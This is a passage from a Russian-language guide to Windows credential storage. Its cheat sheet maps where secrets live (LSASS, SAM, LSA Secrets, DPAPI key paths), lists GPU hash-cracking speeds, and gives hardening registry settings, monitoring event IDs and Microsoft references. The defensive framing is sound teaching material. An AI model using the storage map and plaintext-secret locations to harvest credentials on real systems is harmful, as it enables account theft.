      Select-Object TimeCreated, @{N="User"; E={$_.Properties[5].Value}}
```

---

## Шпаргалка

```
КАРТА ХРАНИЛИЩ
  LSASS (RAM)         - активные credentials, TGT, DPAPI keys, WDigest
  SAM (реестр)        - NT Hashes локальных пользователей
  LSA Secrets (реестр)- сервисные пароли, $MACHINE.ACC, NL$KM, DPAPI_SYSTEM
  Cached Creds (реестр)- DCC2 хеши (кэш доменных входов)
  Credential Manager  - пользовательские credentials (DPAPI)
  Браузеры            - пароли (DPAPI / NSS)

DPAPI КЛЮЧИ
  User Master Key     - %APPDATA%\Microsoft\Protect\<SID>\{GUID}
  System Master Key   - %WINDIR%\System32\Microsoft\Protect\S-1-5-18\
  Domain Backup Key   - HKLM\SECURITY\Policy\Secrets\G$BCKUPKEY_* (на DC)

LSA SECRETS (ключевые)
  $MACHINE.ACC        - пароль machine account (домен)
  _SC_<Service>       - пароль сервисного аккаунта (plaintext!)
  NL$KM               - ключ шифрования кэша
  DPAPI_SYSTEM        - системный DPAPI мастер-ключ
  G$BCKUPKEY_*        - Domain DPAPI Backup Key (только DC)
  DefaultPassword     - пароль AutoLogon (plaintext!)

ХЕШИ: СКОРОСТЬ ВЗЛОМА (RTX 3090 GPU)
  NT Hash (MD4)       - 70 млрд/сек (КРИТИЧНО быстро)
  NTLMv2 response     - 5 млрд/сек
  DCC2 (MSCache2)     - 200 млн/сек (медленнее, но не неуязвимо)

РЕЕСТРОВЫЕ КЛЮЧИ (ЗАЩИТА)
  WDigest выключить:
    HKLM\SYSTEM\...\SecurityProviders\WDigest\UseLogonCredential = 0
  PPL для LSASS:
    HKLM\SYSTEM\...\Lsa\RunAsPPL = 1
  Credential Guard:
    HKLM\SYSTEM\...\DeviceGuard\EnableVirtualizationBasedSecurity = 1
    HKLM\SYSTEM\...\Lsa\LsaCfgFlags = 1
  AutoLogon (убрать!):
    HKLM\SOFTWARE\...\Winlogon\DefaultPassword

CMDKEY КОМАНДЫ
  cmdkey /list              - показать все credentials
  cmdkey /add:server /user:u /pass:p   - добавить
  cmdkey /delete:target     - удалить

EVENT ID ДЛЯ МОНИТОРИНГА
  4624  - успешный вход (тип 8 = WDigest = plaintext риск)
  4625  - неудачный вход
  4648  - вход с явными credentials
  4672  - вход со спец. привилегиями (SeDebug = подозрительно)
  4776  - NTLM Credential Validation
  10 (Sysmon) - обращение к lsass.exe = возможный дамп!

ЗАЩИТА: ПРИОРИТЕТ
  1. Credential Guard      - изолирует LSASS (лучшее)
  2. PPL для LSASS         - защищает от дампа
  3. WDigest = 0           - не хранить plaintext
  4. Protected Users       - для привилегированных аккаунтов
  5. LAPS                  - уникальные local admin пароли
  6. SMB Signing           - от relay атак
  7. Отключить LLMNR/NBT-NS- убрать векторы relay
```

---

## Ссылки

- [DPAPI internals](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/) - официальная документация DPAPI
- [Credential Manager API](https://learn.microsoft.com/en-us/windows/win32/api/wincred/) - Win32 Credential API
- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) - Protected Users
- [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) - документация Credential Guard
- [LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) - PPL для LSASS
- [LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview) - Local Administrator Password Solution
- [Cached Credentials](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)) - Cached Domain Credentials
- [ASR Rules](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference) - правила Attack Surface Reduction
- [MITRE: OS Credential Dumping](https://attack.mitre.org/techniques/T1003/) - T1003 и подтехники
